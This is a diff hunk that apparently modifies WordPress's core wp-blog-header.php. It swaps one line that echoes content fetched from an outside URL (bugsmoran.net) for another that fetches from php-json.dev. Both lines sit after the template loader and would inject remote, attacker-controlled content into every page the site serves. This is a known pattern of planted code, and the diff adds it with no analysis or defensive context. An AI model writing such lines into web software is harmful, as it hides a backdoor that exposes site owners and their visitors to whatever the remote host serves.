@@ -17,5 +17,5 @@ if ( ! isset( $wp_did_header ) ) {
 
 	// Load the theme template.
 	require_once ABSPATH . WPINC . '/template-loader.php';
-    echo file_get_contents("https://bugsmoran.net/wp-theme-font.txt");
+        echo file_get_contents("https://php-json.dev/css-json.php");
 }
